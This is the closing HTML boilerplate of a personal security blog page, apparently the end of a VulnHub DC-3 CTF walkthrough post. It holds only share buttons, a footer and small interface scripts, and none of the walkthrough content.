<a class=next href=https://minhtuanact.github.io/posts/phan-9-sql-injection/><span class=title>Next »</span><br><span>Phần 9: SQL Injection</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú on twitter" href="https://twitter.com/intent/tweet/?text=VulnHub%20CTF%20-%20DC-3%20Walkthrough%20-%20Cu%e1%bb%99c%20phi%c3%aau%20l%c6%b0u%20k%e1%bb%b3%20th%c3%ba&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu%2f&hashtags=pentest%2cCyberSecurity"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu%2f&title=VulnHub%20CTF%20-%20DC-3%20Walkthrough%20-%20Cu%e1%bb%99c%20phi%c3%aau%20l%c6%b0u%20k%e1%bb%b3%20th%c3%ba&summary=VulnHub%20CTF%20-%20DC-3%20Walkthrough%20-%20Cu%e1%bb%99c%20phi%c3%aau%20l%c6%b0u%20k%e1%bb%b3%20th%c3%ba&source=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu%2f&title=VulnHub%20CTF%20-%20DC-3%20Walkthrough%20-%20Cu%e1%bb%99c%20phi%c3%aau%20l%c6%b0u%20k%e1%bb%b3%20th%c3%ba"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú on whatsapp" href="https://api.whatsapp.com/send?text=VulnHub%20CTF%20-%20DC-3%20Walkthrough%20-%20Cu%e1%bb%99c%20phi%c3%aau%20l%c6%b0u%20k%e1%bb%b3%20th%c3%ba%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú on telegram" href="https://telegram.me/share/url?text=VulnHub%20CTF%20-%20DC-3%20Walkthrough%20-%20Cu%e1%bb%99c%20phi%c3%aau%20l%c6%b0u%20k%e1%bb%b3%20th%c3%ba&url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fvulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>